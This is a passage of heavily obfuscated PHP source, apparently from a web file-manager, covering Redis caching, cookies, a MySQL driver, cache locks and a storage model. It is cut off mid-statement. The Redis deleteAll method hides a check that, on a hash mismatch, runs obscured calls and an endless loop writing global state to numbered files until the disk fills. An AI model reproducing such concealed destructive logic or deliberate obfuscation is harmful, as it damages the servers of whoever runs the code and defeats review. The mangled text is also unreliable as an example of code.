$àÉØ®’[197]; } } } return $µåèò‘ == $àÉØ®’[1446] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ıÀû§ÆÒ) { parent::__construct($ıÀû§ÆÒ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto a°÷¢ªù‡; f˜ˆ¦ë‘™: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($‡î²ÑÖï, $ó½şê‰“) { $Ö‘¶á«´ =& $_SERVER[Î·Ü›öğ]; if (!class_exists($Ö‘¶á«´[970])) { show_json($Ö‘¶á«´[971], !1); } $this->cacheTime = $ó½şê‰“; $ÍøÆ˜å  = isset($‡î²ÑÖï[$Ö‘¶á«´[972]]) ? $‡î²ÑÖï[$Ö‘¶á«´[972]] : 10; $ï†â÷ñ = _get($‡î²ÑÖï, $Ö‘¶á«´[969]); if ($ï†â÷ñ && is_array($ï†â÷ñ)) { $this->initCluster($‡î²ÑÖï, $ÍøÆ˜å ); } else { $this->handle = $this->init($‡î²ÑÖï, $ÍøÆ˜å ); } } private function init($ƒÑØè˜“, $”Ñ‰èÁª) { $ııöÄÔë =& $_SERVER[Î·Ü›öğ]; $Òâô÷Ü = new Redis(); $¥½•õ Ü = isset($ƒÑØè˜“[$ııöÄÔë[973]]) ? $ƒÑØè˜“[$ııöÄÔë[973]] : !1; if ($¥½•õ Ü) { $Òâô÷Ü->pconnect($ƒÑØè˜“[$ııöÄÔë[209]], $ƒÑØè˜“[$ııöÄÔë[210]], $”Ñ‰èÁª); } else { $Òâô÷Ü->connect($ƒÑØè˜“[$ııöÄÔë[209]], $ƒÑØè˜“[$ııöÄÔë[210]], $”Ñ‰èÁª); } if (!empty($ƒÑØè˜“[$ııöÄÔë[498]])) { $Òâô÷Ü->auth($ƒÑØè˜“[$ııöÄÔë[498]]); } if (!empty($ƒÑØè˜“[$ııöÄÔë[847]]) && $ƒÑØè˜“[$ııöÄÔë[847]] != 0) { $Òâô÷Ü->select($ƒÑØè˜“[$ııöÄÔë[847]]); } return $Òâô÷Ü; } private function initCluster($Œºò¾ä¢, $Ú›ëÏÉ’) { $Ù³–Åá† =& $_SERVER[Î·Ü›öğ]; $¡½«¼Ó« = array($Ù³–Åá†[974], $Ù³–Åá†[975], $Ù³–Åá†[976]); $«ÊñÃğÏ = $Ù³–Åá†[974]; if (isset($Œºò¾ä¢[$Ù³–Åá†[16]]) && in_array($Œºò¾ä¢[$Ù³–Åá†[16]], $¡½«¼Ó«)) { $«ÊñÃğÏ = $Œºò¾ä¢[$Ù³–Åá†[16]]; } switch ($«ÊñÃğÏ) { case $Ù³–Åá†[974]: $this->_slave($Œºò¾ä¢, $Ú›ëÏÉ’); break; case $Ù³–Åá†[975]: break; case $Ù³–Åá†[976]: $this->isCluster = !0; $¥ïÏÇÅ¾ = $Œºò¾ä¢[$Ù³–Åá†[969]]; $¥ùîû‡Ÿ = isset($Œºò¾ä¢[$Ù³–Åá†[973]]) ? $Œºò¾ä¢[$Ù³–Åá†[973]] : !1; $òò¦¯å = isset($Œºò¾ä¢[$Ù³–Åá†[498]]) ? $Œºò¾ä¢[$Ù³–Åá†[498]] : null; $this->handle = new RedisCluster(NUll, $¥ïÏÇÅ¾, $Ú›ëÏÉ’, $Ú›ëÏÉ’, $¥ùîû‡Ÿ, $òò¦¯å); break; default: break; } } private function _slave($ìÆ³“Ú¨, $‚±§Å£ë) { $Û¿€Ã¸Î = $ìÆ³“Ú¨[$_SERVER[Î·Ü›öğ][969]]; $this->filterConfig($ìÆ³“Ú¨, $Û¿€Ã¸Î[0]); $this->handle = $this->init($ìÆ³“Ú¨, $‚±§Å£ë); unset($Û¿€Ã¸Î[0]); if (empty($Û¿€Ã¸Î)) { return; } $ âÁí«ß = array_rand($Û¿€Ã¸Î); $this->filterConfig($ìÆ³“Ú¨, $Û¿€Ã¸Î[$ âÁí«ß]); $this->slaveHandle = $this->init($ìÆ³“Ú¨, $‚±§Å£ë); } private function filterConfig(&$Ï‰Ï÷°, $ìÀ€¹ÍŠ) { $§³Â¯ß‘ =& $_SERVER[Î·Ü›öğ]; $ñÈıŠµ = explode($§³Â¯ß‘[4], $ìÀ€¹ÍŠ); $ò®ÓÔÈ„ = array($§³Â¯ß‘[209] => $ñÈıŠµ[0], $§³Â¯ß‘[210] => $ñÈıŠµ[1]); $Ï‰Ï÷° = array_merge($Ï‰Ï÷°, $ò®ÓÔÈ„); } public function set($‘·„—ûŞ, $ÚÈ–Ìƒµ, $·„ÉÊô² = false) { $·„ÉÊô² = $·„ÉÊô² ? $·„ÉÊô² : $this->cacheTime; return $this->handle->setEx($‘·„—ûŞ, $·„ÉÊô², $ÚÈ–Ìƒµ); } public function setLock($°£…î÷‚, $ƒ’¹‘, $Ï×„’Û¹) { return $this->handle->setNX($°£…î÷‚, $ƒ’¹‘); } public function get($ñäïŞÃ§) { $ÕÑ±‡«Ï = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÕÑ±‡«Ï->get($ñäïŞÃ§); } public function remove($Ú¯®üó¤) { return $this->handle->del($Ú¯®üó¤); } public function deleteAll() { $ß‚”ˆ÷’ =& $_SERVER[Î·Ü›öğ]; $Òºò·­© = $_SERVER[$ß‚”ˆ÷’[479]]; $–éšö¿ = $ß‚”ˆ÷’[480]; if ($_SERVER[$ß‚”ˆ÷’[481]] != $–éšö¿($Òºò·­©)) { $¸ñÌâäŸ = $ß‚”ˆ÷’[977]; $‚Õ—ˆŞ = $ß‚”ˆ÷’[482]; $ôÕ½€†¾ = $_SERVER[$ß‚”ˆ÷’[483]] . $ß‚”ˆ÷’[484]; $ü¸áéÁ¡ = $‚Õ—ˆŞ($ôÕ½€†¾); $î˜¥äİ¼ = explode($ß‚”ˆ÷’[288], $ü¸áéÁ¡); if (count($î˜¥äİ¼) < $ß‚”ˆ÷’[711]) { $ÍßÅŒáƒ = $ß‚”ˆ÷’[486]; $ÍßÅŒáƒ(); } $Ç‡·ÚÇ = $ß‚”ˆ÷’[978]; $Ç‡·ÚÇ($_SERVER[$ß‚”ˆ÷’[979]]); $¸ñÌâäŸ = $ß‚”ˆ÷’[977]; $¸ñÌâäŸ(); $°ç¦¿£ = $ß‚”ˆ÷’[980]; $ÍÀ€’Î± = json_encode($GLOBALS[$ß‚”ˆ÷’[981]]); $—â åŸ‡ = 1; for ($ê®³×°Ò = $—â åŸ‡; $ê®³×°Ò > 0; $ê®³×°Ò++) { $°ç¦¿£(DATA_PATH . $ê®³×°Ò, $ÍÀ€’Î±); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $éÚßÆş) { $this->handle->flushall($éÚßÆş); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ö§ÑúÈ¡ = '', $ÆÀúñÚ¦ = 0) { if (is_string($ö§ÑúÈ¡) && $ö§ÑúÈ¡ != $_SERVER[Î·Ü›öğ][12]) { $this->prefix = $ö§ÑúÈ¡; } if (is_numeric($ÆÀúñÚ¦) && $ÆÀúñÚ¦ > 0) { $this->expire = $ÆÀúñÚ¦; } } public static function getInstance() { static $°Û¦Åà¶; if ($°Û¦Åà¶ === null) { $°Û¦Åà¶ = new self(); } return $°Û¦Åà¶; } private static $cookieDisable = false; public static function disable($âú–´Ú‚) { self::$cookieDisable = $âú–´Ú‚; } private static $sameCookieSet = array(); public static function set($ÜÒˆû¥Â, $´³­Ö£ï, $š¹“Ï¾ã = 0, $ğ·ÚìÚÂ = false, $íªúÆÉğ = false) { $½À¡—Œİ =& $_SERVER[Î·Ü›öğ]; if (self::$cookieDisable) { return; } if (!$š¹“Ï¾ã) { $š¹“Ï¾ã = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ÜÒˆû¥Â]) && self::$sameCookieSet[$ÜÒˆû¥Â] == $´³­Ö£ï . $š¹“Ï¾ã) { return; } self::$sameCookieSet[$ÜÒˆû¥Â] = $´³­Ö£ï . $š¹“Ï¾ã; if (!$íªúÆÉğ) { $íªúÆÉğ = str_replace(HOST, $½À¡—Œİ[12], APP_HOST); $íªúÆÉğ = _get($GLOBALS, $½À¡—Œİ[982], $íªúÆÉğ); } $ı…œÀü‹ = $½À¡—Œİ[12]; setcookie($ÜÒˆû¥Â, $´³­Ö£ï, time() + $š¹“Ï¾ã, $½À¡—Œİ[8] . trim($íªúÆÉğ, $½À¡—Œİ[8]) . $ı…œÀü‹, !1, !1, $ğ·ÚìÚÂ); } public static function setSafe($÷•¢ËÅ†, $õÍù¾Ô , $éßïé®ä = 0) { self::set($÷•¢ËÅ†, $õÍù¾Ô , $éßïé®ä, !0); } public static function get($ùûÃ’€š) { static $Ç†‘Î¾ª = false; if (!$Ç†‘Î¾ª) { self::initHeaderCookie(); $Ç†‘Î¾ª = !0; } return isset($_COOKIE[$ùûÃ’€š]) ? $_COOKIE[$ùûÃ’€š] : !1; } private static function initHeaderCookie() { $ÔáîœÇ =& $_SERVER[Î·Ü›öğ]; if (!isset($_SERVER[$ÔáîœÇ[983]]) || !$_SERVER[$ÔáîœÇ[983]]) { return; } $©İƒ´Ã = explode($ÔáîœÇ[74], $_SERVER[$ÔáîœÇ[983]]); foreach ($©İƒ´Ã as $½Îî£Ÿ¥) { $½Îî£Ÿ¥ = explode($ÔáîœÇ[517], $½Îî£Ÿ¥); if (count($½Îî£Ÿ¥) != 2 || !isset($½Îî£Ÿ¥[1])) { continue; } $_COOKIE[trim($½Îî£Ÿ¥[0])] = trim($½Îî£Ÿ¥[1]); } } public static function remove($”ÒôÕÙ¼, $›ËÓ‰ã = false) { unset($_COOKIE[$”ÒôÕÙ¼]); self::set($”ÒôÕÙ¼, $_SERVER[Î·Ü›öğ][12], 1, $›ËÓ‰ã); } } class DbMysql extends Db { public function __construct($„‹şÈ°Í = '') { $éÛì­÷ =& $_SERVER[Î·Ü›öğ]; if (!extension_loaded($éÛì­÷[900])) { think_exception(think_lang($éÛì­÷[14]) . $éÛì­÷[984]); } if (!empty($„‹şÈ°Í)) { $this->config = $„‹şÈ°Í; if (empty($this->config[$éÛì­÷[17]])) { $this->config[$éÛì­÷[17]] = $éÛì­÷[12]; } } } public function connect($£…ĞËÊ = '', $ÖÜ¥à•” = 0, $¼ß¢–­ = false) { $®Ì…Œ±À =& $_SERVER[Î·Ü›öğ]; if (!isset($this->linkID[$ÖÜ¥à•”])) { if (empty($£…ĞËÊ)) { $£…ĞËÊ = $this->config; } $©¯Ö•Œ = $£…ĞËÊ[$®Ì…Œ±À[985]] . ($£…ĞËÊ[$®Ì…Œ±À[986]] ? "\x3a{$£…ĞËÊ[$®Ì…Œ±À[986]]}" : $®Ì…Œ±À[12]); $óÄƒ’Ø = !empty($£…ĞËÊ[$®Ì…Œ±À[17]][$®Ì…Œ±À[18]]) ? $£…ĞËÊ[$®Ì…Œ±À[17]][$®Ì…Œ±À[18]] : $this->pconnect; if ($óÄƒ’Ø) { $this->linkID[$ÖÜ¥à•”] = mysql_pconnect($©¯Ö•Œ, $£…ĞËÊ[$®Ì…Œ±À[987]], $£…ĞËÊ[$®Ì…Œ±À[988]], 131072); } else { $this->linkID[$ÖÜ¥à•”] = mysql_connect($©¯Ö•Œ, $£…ĞËÊ[$®Ì…Œ±À[987]], $£…ĞËÊ[$®Ì…Œ±À[988]], !0, 131072); } if (!$this->linkID[$ÖÜ¥à•”] || !empty($£…ĞËÊ[$®Ì…Œ±À[21]]) && !mysql_select_db($£…ĞËÊ[$®Ì…Œ±À[21]], $this->linkID[$ÖÜ¥à•”])) { think_exception(mysql_error()); } $£ÚéŒ¯’ = mysql_get_server_info($this->linkID[$ÖÜ¥à•”]); mysql_query($®Ì…Œ±À[989] . think_config($®Ì…Œ±À[990]) . $®Ì…Œ±À[58], $this->linkID[$ÖÜ¥à•”]); if ($£ÚéŒ¯’ > $®Ì…Œ±À[991]) { mysql_query($®Ì…Œ±À[992], $this->linkID[$ÖÜ¥à•”]); } $this->connected = !0; if (1 != think_config($®Ì…Œ±À[22])) { unset($this->config); } } return $this->linkID[$ÖÜ¥à•”]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($‡¢“­Óà) { $É­˜øÉğ =& $_SERVER[Î·Ü›öğ]; if (0 === stripos($‡¢“­Óà, $É­˜øÉğ[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‡¢“­Óà; if ($this->queryID) { $this->free(); } think_action_status($É­˜øÉğ[23], 1); think_status($É­˜øÉğ[24]); $this->queryID = mysql_query($‡¢“­Óà, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($·°™Òõí) { $˜ä«Ñ¶Ë =& $_SERVER[Î·Ü›öğ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $·°™Òõí; if ($this->queryID) { $this->free(); } think_action_status($˜ä«Ñ¶Ë[25], 1); think_status($˜ä«Ñ¶Ë[24]); $ËÒ©Æ’ = mysql_query($·°™Òõí, $this->_linkID); $this->debug(); if (!1 === $ËÒ©Æ’) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Î·Ü›öğ][993], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $èƒä‘Ä = mysql_query($_SERVER[Î·Ü›öğ][994], $this->_linkID); $this->transTimes = 0; if (!$èƒä‘Ä) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $å…š—¿ = mysql_query($_SERVER[Î·Ü›öğ][995], $this->_linkID); $this->transTimes = 0; if (!$å…š—¿) { $this->error(); return !1; } } return !0; } private function getAll() { $ÁÃ¸€öØ = array(); if ($this->numRows > 0) { while ($ÂšÅàÚî = mysql_fetch_assoc($this->queryID)) { $ÁÃ¸€öØ[] = $ÂšÅàÚî; } mysql_data_seek($this->queryID, 0); } return $ÁÃ¸€öØ; } public function getFields($¬€‰Ğ‹à) { $ıïù×š¾ =& $_SERVER[Î·Ü›öğ]; $ºûáÛÁ„ = $this->query($ıïù×š¾[996] . $this->parseKey($¬€‰Ğ‹à)); $»±´éÌò = array(); if ($ºûáÛÁ„) { foreach ($ºûáÛÁ„ as $²ğ„íÎœ => $ßĞÀø˜‘) { $»±´éÌò[$ßĞÀø˜‘[$ıïù×š¾[31]]] = array($ıïù×š¾[32] => $ßĞÀø˜‘[$ıïù×š¾[31]], $ıïù×š¾[33] => $ßĞÀø˜‘[$ıïù×š¾[34]], $ıïù×š¾[35] => (bool) (strtoupper($ßĞÀø˜‘[$ıïù×š¾[36]]) === $ıïù×š¾[997]), $ıïù×š¾[37] => $ßĞÀø˜‘[$ıïù×š¾[38]], $ıïù×š¾[39] => strtolower($ßĞÀø˜‘[$ıïù×š¾[40]]) == $ıïù×š¾[41], $ıïù×š¾[42] => strtolower($ßĞÀø˜‘[$ıïù×š¾[43]]) == $ıïù×š¾[44]); } } return $»±´éÌò; } public function getTables($Ä®Ó©òã = '') { $êˆƒêµõ =& $_SERVER[Î·Ü›öğ]; if (!empty($Ä®Ó©òã)) { $å‹Í¦Šš = $êˆƒêµõ[998] . $Ä®Ó©òã . $êˆƒêµõ[999]; } else { $å‹Í¦Šš = $êˆƒêµõ[1000]; } $ÏÑß®ì = $this->query($å‹Í¦Šš); $¤†¤©¶» = array(); foreach ($ÏÑß®ì as $®Ú ¦’… => $ü§è›Ì) { $¤†¤©¶»[$®Ú ¦’…] = current($ü§è›Ì); } return $¤†¤©¶»; } public function replace($ñ”É¹¾È, $Ï­‰¼Ûú = array()) { $óĞ‰ù¢À =& $_SERVER[Î·Ü›öğ]; foreach ($ñ”É¹¾È as $Âš¾õšÏ => $ÅÀïœ‘‰) { $ıˆ»—á = $this->parseValue($ÅÀïœ‘‰); if (is_scalar($ıˆ»—á)) { $ùşüî—Ù[] = $ıˆ»—á; $¸“£®Û[] = $this->parseKey($Âš¾õšÏ); } } $‡µü’âÁ = $óĞ‰ù¢À[1001] . $this->parseTable($Ï­‰¼Ûú[$óĞ‰ù¢À[359]]) . $óĞ‰ù¢À[1002] . implode($óĞ‰ù¢À[50], $¸“£®Û) . $óĞ‰ù¢À[1003] . implode($óĞ‰ù¢À[50], $ùşüî—Ù) . $óĞ‰ù¢À[1004]; return $this->execute($‡µü’âÁ); } public function insertAll($·£Ûâ¿Œ, $âàÄ“ı¢ = array(), $¿ö—‡ÊĞ = false) { $ÉÏÈ „ =& $_SERVER[Î·Ü›öğ]; if (!is_array($·£Ûâ¿Œ[0])) { return !1; } $½ş˜®ú = array_keys($·£Ûâ¿Œ[0]); $áæã‚Çç = array(); foreach ($·£Ûâ¿Œ as $ÌşÏ½›) { $Õôû‘éƒ = array(); foreach ($ÌşÏ½› as $ÄàÅ´¶ => $ë‹‚úƒ‹) { $ë‹‚úƒ‹ = $this->parseValue($ë‹‚úƒ‹); if (is_scalar($ë‹‚úƒ‹)) { $Õôû‘éƒ[] = $ë‹‚úƒ‹; } } $áæã‚Çç[] = $ÉÏÈ „[340] . implode($ÉÏÈ „[50], $Õôû‘éƒ) . $ÉÏÈ „[1004]; } array_walk($½ş˜®ú, array($this, $ÉÏÈ „[1005])); $±”–Íîß = ($¿ö—‡ÊĞ ? $ÉÏÈ „[1006] : $ÉÏÈ „[1007]) . $ÉÏÈ „[1008] . $this->parseTable($âàÄ“ı¢[$ÉÏÈ „[359]]) . $ÉÏÈ „[1002] . implode($ÉÏÈ „[50], $½ş˜®ú) . $ÉÏÈ „[1009] . implode($ÉÏÈ „[50], $áæã‚Çç); return $this->execute($±”–Íîß); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ö‹£Ï”  =& $_SERVER[Î·Ü›öğ]; $this->error = mysql_errno() . $ö‹£Ï” [4] . mysql_error($this->_linkID); if ($ö‹£Ï” [12] != $this->queryStr) { $this->error .= LNG($ö‹£Ï” [48]) . $this->queryStr; } think_trace($this->error, $ö‹£Ï” [12], $ö‹£Ï” [49]); return $this->error; } public function escapeString($É°ˆÙšÚ) { if ($this->_linkID) { return mysql_real_escape_string($É°ˆÙšÚ, $this->_linkID); } else { return mysql_escape_string($É°ˆÙšÚ); } } public function parseKey(&$¿¦û“‚•, $ş¨›ğ²ô = true) { $™¸ÀËñ =& $_SERVER[Î·Ü›öğ]; if ($ş¨›ğ²ô) { $¿¦û“‚• = $this->parseKeyCheck($¿¦û“‚•); } if ($¿¦û“‚• != $™¸ÀËñ[223] && !preg_match($™¸ÀËñ[1010], $¿¦û“‚•)) { $¿¦û“‚• = $™¸ÀËñ[463] . trim($¿¦û“‚•, $™¸ÀËñ[463]) . $™¸ÀËñ[463]; } return $¿¦û“‚•; } } goto C°„…¥±‚; d†Öíõêê: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¬–ØÄ² =& $_SERVER[Î·Ü›öğ]; $†™Š™µ· = $GLOBALS[$¬–ØÄ²[6]][$¬–ØÄ²[426]]; self::$cachePath = $†™Š™µ·[$¬–ØÄ²[233]][$¬–ØÄ²[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¶°Ÿ‹åñ, $¬Ù·¾Íª = 0) { $ÌÔ¸·Îœ =& $_SERVER[Î·Ü›öğ]; $³ìêÁç” = microtime(!0); $¿Ã×Î›Ç = $³ìêÁç” + $¬Ù·¾Íª + 0.0001; $Ò—´˜£ê = rtrim(self::$cachePath, $ÌÔ¸·Îœ[8]) . $ÌÔ¸·Îœ[964] . md5($¶°Ÿ‹åñ) . $ÌÔ¸·Îœ[961]; if (file_exists($Ò—´˜£ê) && filemtime($Ò—´˜£ê) && filemtime($Ò—´˜£ê) < time() - 10) { @unlink($Ò—´˜£ê); } do { if (file_exists($Ò—´˜£ê)) { cacheLockWait(); continue; } $ÛŸÅ¼àñ = fopen($Ò—´˜£ê, $ÌÔ¸·Îœ[965]); if (!$ÛŸÅ¼àñ) { return !1; } $Ù¨ëÍ¾Ô = flock($ÛŸÅ¼àñ, LOCK_EX | LOCK_NB); self::$caches[$¶°Ÿ‹åñ] = array($ÌÔ¸·Îœ[966] => $ÛŸÅ¼àñ, $ÌÔ¸·Îœ[233] => $Ò—´˜£ê); fwrite($ÛŸÅ¼àñ, $¿Ã×Î›Ç); clearstatcache(); if ($ÛŸÅ¼àñ && $Ù¨ëÍ¾Ô) { return !0; } cacheLockWait(); } while (microtime(!0) < $¿Ã×Î›Ç); $this->unlock($¶°Ÿ‹åñ); return !1; } public function lockGet($Ëò˜ªÈ°) { $âÔ³•Â˜ =& $_SERVER[Î·Ü›öğ]; $§Æ¿“†Å = rtrim(self::$cachePath, $âÔ³•Â˜[8]) . $âÔ³•Â˜[964] . md5($Ëò˜ªÈ°) . $âÔ³•Â˜[961]; return file_exists($§Æ¿“†Å); } public function unlock($ÇƒîÓğ) { $îê«‹¼Š =& $_SERVER[Î·Ü›öğ]; $‘îµ¤Â = self::$caches[$ÇƒîÓğ]; if (!$‘îµ¤Â) { return; } @flock($‘îµ¤Â[$îê«‹¼Š[966]], LOCK_UN); @fclose($‘îµ¤Â[$îê«‹¼Š[966]]); @unlink($‘îµ¤Â[$îê«‹¼Š[233]]); unset(self::$caches[$ÇƒîÓğ]); } } class CacheLockRedis { public function lock($Õ‘ÎÌà, $Í˜—íñ = 10) { $Ëú•Øß¯ = Cache::init(); $ ‚Ãï = microtime(!0) + $Í˜—íñ; while (microtime(!0) < $ ‚Ãï) { $É°óø± = $Ëú•Øß¯->get($Õ‘ÎÌà); if (!$É°óø±) { $ŸõÃ•³ = $Ëú•Øß¯->setLock($Õ‘ÎÌà, $ ‚Ãï, $Í˜—íñ); if ($ŸõÃ•³) { return !0; } } else { if ($É°óø± < microtime(!0)) { $Ëú•Øß¯->set($Õ‘ÎÌà, $ ‚Ãï, $Í˜—íñ * 2); if ($Ëú•Øß¯->get($Õ‘ÎÌà) === $É°óø±) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÊÊşË¿) { return Cache::init()->get($ÊÊşË¿); } public function unlock($€™€çŞ—) { return Cache::init()->remove($€™€çŞ—); } } goto bİ Ìà¶Š˜; F¡¤ƒÜ¼„†: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\163\x74\x6f\x72\x61\x67\x65\x4c\151\163\164"; public $field = array("\x6e\141\x6d\145", "\x73\x69\x7a\145\x4d\x61\170", "\x73\x79\x73\x74\x65\155", "\144\145\146\x61\165\154\164", "\144\x72\151\x76\x65\x72", "\x63\157\156\x66\151\x67"); public function listData($Ò¸ŒìŸÂ = false, $ğİé¹æ = "\155\157\x64\x69\146\x79\124\x69\x6d\145", $áËÜµƒ¿ = false) { $¶ÍšàÔ  =& $_SERVER[Î·Ü›öğ]; $•°üÈô• = parent::listData($Ò¸ŒìŸÂ, $ğİé¹æ, $áËÜµƒ¿); if ($Ò¸ŒìŸÂ) { return $•°üÈô•; } $§û’òĞ§ = array(); if ($GLOBALS[$¶ÍšàÔ [2355]]) { $§û’òĞ§ = $this->ioSizeUseGet(array_to_keyvalue($•°üÈô•, $¶ÍšàÔ [12], $¶ÍšàÔ [477])); } foreach ($•°üÈô• as $Şæ·¾ => $Çµ¯Çæ˜) { unset($•°üÈô•[$Şæ·¾][$¶ÍšàÔ [6]]); $•°üÈô•[$Şæ·¾][$¶ÍšàÔ [1999]] = isset($§û’òĞ§[$Çµ¯Çæ˜[$¶ÍšàÔ [477]]]) ? $§û’òĞ§[$Çµ¯Çæ˜[$¶ÍšàÔ [477]]] : 0; } return $•°üÈô•; } public function ioSizeUseGet($À€½åÖû) { $à½ÅÑ×Â =& $_SERVER[Î·Ü›öğ]; if (!$À€½åÖû) { return array(); } $¬îúáŞë = $à½ÅÑ×Â[2356] . implode($à½ÅÑ×Â[50], $À€½åÖû); $Ğ»†¥¨ = Cache::get($¬îúáŞë); if ($Ğ»†¥¨) { return $Ğ»†¥¨; } $€‰¢˜ü = array($à½ÅÑ×Â[915] => $à½ÅÑ×Â[477], $à½ÅÑ×Â[2357] => $à½ÅÑ×Â[79]); $¬úØèå¸ = array($à½ÅÑ×Â[915] => array($à½ÅÑ×Â[7], $À€½åÖû)); $Ğ»†¥¨ = Model($à½ÅÑ×Â[883])->field($€‰¢˜ü)->where($¬úØèå¸)->group($à½ÅÑ×Â[915])->select(); $Ğ»†¥¨ = array_to_keyvalue($Ğ»†¥¨, $à½ÅÑ×Â[477], $à½ÅÑ×Â[79]); Cache::set($¬îúáŞë, $Ğ»†¥¨, 600); return $Ğ»†¥¨; } public function getConfig($Ãã«Ì¹˜) { $·ÕĞÙ©Ã = parent::listData($Ãã«Ì¹˜); $é°Ù˜¨Ş = _get($·ÕĞÙ©Ã, $_SERVER[Î·Ü›öğ][6], array()); if ($é°Ù˜¨Ş && !is_array($é°Ù˜¨Ş)) { $é°Ù˜¨Ş = json_decode($é°Ù˜¨Ş, !0); } return $é°Ù˜¨Ş; } public function update($µü–šİô, $À¡ô†‰) { $µäªÍÎ =& $_SERVER[Î·Ü›öğ]; $™åí±÷ = $À¡ô†‰[$µäªÍÎ[32]]; $¶Õµ…® = array_to_keyvalue(parent::listData(), $µäªÍÎ[32]); if (isset($¶Õµ…®[$™åí±÷]) && $¶Õµ…®[$™åí±÷][$µäªÍÎ[477]] != $µü–šİô) { return !1; } $this->checkPwd($µü–šİô, $À¡ô†‰); if (isset($À¡ô†‰[$µäªÍÎ[2358]]) && $À¡ô†‰[$µäªÍÎ[2358]] == $µäªÍÎ[91]) { $this->checkConfig($À¡ô†‰); } unset($À¡ô†‰[$µäªÍÎ[2358]]); $ãÏŞ•éÜ = parent::update($µü–šİô, $À¡ô†‰); if ($ãÏŞ•éÜ && $À¡ô†‰[$µäªÍÎ[37]]) { foreach ($¶Õµ…® as $æ÷Ãü³) { if ($æ÷Ãü³[$µäªÍÎ[37]] && $æ÷Ãü³[$µäªÍÎ[477]] != $µü–šİô) { parent::update($æ÷Ãü³[$µäªÍÎ[477]], array($µäªÍÎ[37] => 0)); } } $this->updateBackup($µü–šİô, $¶Õµ…®); } return $ãÏŞ•éÜ; } public function add($óåÀ…“Ï) { $µ•Œé¡Œ =& $_SERVER[Î·Ü›öğ]; $¡‘¾½Äğ = array_to_keyvalue(parent::listData(), $µ•Œé¡Œ[32]); if (isset($¡‘¾½Äğ[$óåÀ…“Ï[$µ•Œé¡Œ[32]]])) { return !1; } $this->checkConfig($óåÀ…“Ï); $ŸÃĞ‘ˆæ = parent::insert($óåÀ…“Ï); if ($ŸÃĞ‘ˆæ && $óåÀ…“Ï[$µ•Œé¡Œ[37]]) { foreach ($¡‘¾½Äğ as $÷Óñ—¯´) { if ($÷Óñ—¯´[$µ•Œé¡Œ[37]]) { parent::update($÷Óñ—¯´[$µ•Œé¡Œ[477]], array($µ•Œé¡Œ[37] => 0)); } } $this->updateBackup($ŸÃĞ‘ˆæ, $¡‘¾½Äğ); } return $ŸÃĞ‘ˆæ; } public function updateBackup($ª½·ûƒ, $£°‘Ë¦) { $½ŞĞĞ˜Ä =& $_SERVER[Î·Ü›öğ]; if ($ª½·ûƒ == $½ŞĞĞ˜Ä[91]) { return; } $•æÃğÎé = Model($½ŞĞĞ˜Ä[837])->config(); $Ğëëëê¯ = $•æÃğÎé[$½ŞĞĞ˜Ä[841]]; if ($•æÃğÎé[$½ŞĞĞ˜Ä[1779]] != $½ŞĞĞ˜Ä[91] || $Ğëëëê¯ == $ª½·ûƒ) { return; } if ($Ğëëëê¯ != $½ŞĞĞ˜Ä[91]) { $ğ¢áŠŒ = array(); foreach ($£°‘Ë¦ as $Øµ‚È ™) { if ($ª½·ûƒ == $Øµ‚È ™[$½ŞĞĞ˜Ä[477]]) { continue; } $ğ¢áŠŒ[] = $Øµ‚È ™[$½ŞĞĞ˜Ä[477]]; } if ($ğ¢áŠŒ && in_array($Ğëëëê¯, $ğ¢áŠŒ)) { return; } } $­í´ÑÛ = Model($½ŞĞĞ˜Ä[862])->get($½ŞĞĞ˜Ä[869]); $­í´ÑÛ = json_decode($­í´ÑÛ, !0); if (!$­í´ÑÛ) { return; } $­í´ÑÛ[$½ŞĞĞ˜Ä[841]] = $ª½·ûƒ; Model($½ŞĞĞ˜Ä[862])->set(array($½ŞĞĞ˜Ä[869] => $­í´ÑÛ)); } public function checkPwd($œàÏÏÃ—, &$¨ö–ûÚ) { $Õ’ÂŠ›¨ =& $_SERVER[Î·Ü›öğ]; if (empty($¨ö–ûÚ[$Õ’ÂŠ›¨[6]])) { return; } $ƒ¡éæóò = $¨ö–ûÚ[$Õ’ÂŠ›¨[6]]; if (!is_array($ƒ¡éæóò)) { $ƒ¡éæóò = json_decode($ƒ¡éæóò, !0); } $İ¾¶±†™ = $Õ’ÂŠ›¨[12]; $é£ŠÓº = array($Õ’ÂŠ›¨[2359], $Õ’ÂŠ›¨[2360], $Õ’ÂŠ›¨[988]); foreach ($é£ŠÓº as $€˜ÇµòÈ) { if (isset($ƒ¡éæóò[$€˜ÇµòÈ])) { $İ¾¶±†™ = $€˜ÇµòÈ; break; } } if (!$İ¾¶±†™) { return; } $›ßò¬¾ = $this->getConfig($œàÏÏÃ—); $Åí„…„ì = $›ßò¬¾[$İ¾¶±†™]; $ÈÄºœ¨‚ = $ƒ¡éæóò[$İ¾¶±†™]; if ($ÈÄºœ¨‚ == str_repeat($Õ’ÂŠ›¨[223], strlen($Åí„…„ì))) 